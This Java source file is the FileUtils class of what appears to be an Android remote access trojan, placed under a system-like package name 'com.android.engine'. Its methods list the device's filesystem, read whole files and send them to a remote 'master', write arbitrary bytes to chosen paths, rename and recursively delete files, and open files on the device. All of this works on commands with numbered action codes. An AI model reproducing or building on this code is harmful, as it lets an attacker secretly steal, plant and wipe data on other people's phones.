package com.android.engine;

import Transfer.Action;
import Transfer.FileInfo;
import Transfer.TransferFile;
import android.content.Intent;
import android.net.Uri;
import android.webkit.MimeTypeMap;
import com.android.engine.service.MyService;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

public class FileUtils {

  public static void getFileSystemRoots() {
    try {
      Action action = new Action();
      action.ACTION = 47;

      File[] listRoots = File.listRoots();
      String[] obj = new String[listRoots.length];
      for (int i = 0; i < listRoots.length; i++) {
        obj[i] = listRoots[i].getCanonicalPath();
      }
      action.DATA = obj;
      SendMasterCommunication.sendAction(action);
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }

  public static void createFile(String path) {
    try {
      new File(path).mkdirs();
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }

  public static void renameFile(String path, String newPath) {
    try {
      File file = new File(path);
      new File(path).renameTo(new File(file.getCanonicalPath().replace(file.getName(), newPath)));
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }

  public static void createFile(String path, byte[] bArr) {
    try {
      new BufferedOutputStream(new FileOutputStream(path)).write(bArr, 0, bArr.length);
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }

  public static void deleteFile(String path) {
    try {
      File file = new File(path);
      if (file.isDirectory()) {
        for (File canonicalPath : file.listFiles()) {
          deleteFile(canonicalPath.getCanonicalPath());
        }
      }
      file.delete();
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }

  public static void sendFile(String path) {
    try {
      File file = new File(path);
      if (!file.isDirectory()) {
        TransferFile transferFile = new TransferFile(file.length());
        transferFile.NAME = file.getName();

        BufferedInputStream bufferedInputStream =
            new BufferedInputStream(new FileInputStream(file));
        bufferedInputStream.read(transferFile.CONTENT, 0, transferFile.CONTENT.length);
        bufferedInputStream.close();

        SendMasterCommunication.sendAction(transferFile);
      }
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }

  public static void viewFile(String path) {
    try {
      File file = new File(path);
      String[] split = file.getName().split("\\.");

      Intent intent = new Intent();
      intent.setAction("android.intent.action.VIEW");
      intent.setDataAndType(Uri.fromFile(file),
          MimeTypeMap.getSingleton().getMimeTypeFromExtension(split[split.length - 1]));
      intent.setFlags(FLAG_ACTIVITY_NEW_TASK);

      MyService.context.startActivity(intent);
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }

  public static void sendDirectory(String path) {
    try {
      Action action = new Action();
      action.ACTION = 48;

      List arrayList = new ArrayList();
      for (File file : new File(path).listFiles()) {
        FileInfo fileInfo = new FileInfo();
        fileInfo.NAME = file.getName();
        boolean isDirectory = file.isDirectory();
        fileInfo.ISDIRECTORY = isDirectory;
        if (isDirectory) {
          fileInfo.SIZE = 0;
        } else {
          fileInfo.SIZE = file.length();
        }
        arrayList.add(fileInfo);
      }
      action.DATA = new Object[] { path, arrayList };
      SendMasterCommunication.sendAction(action);
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
